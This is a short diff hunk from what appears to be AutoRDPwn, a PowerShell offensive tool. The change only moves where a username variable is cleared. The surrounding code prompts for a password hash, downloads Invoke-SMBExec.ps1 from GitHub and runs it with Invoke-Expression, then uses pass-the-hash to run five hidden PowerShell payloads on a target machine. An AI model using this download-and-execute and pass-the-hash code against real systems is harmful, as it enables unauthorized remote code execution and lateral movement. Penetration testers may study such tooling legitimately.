@@ -159,13 +159,13 @@ function Remove-Exclusions {
         $domain = 'localhost' ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
         do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
         if(!$hash) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; Start-Sleep -milliseconds 1500 }} until ( $hash )
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; $user = $null
+        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" }
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" } ; $user = $null
 
         '3' {
         if($option) { $computer='localhost' } else {
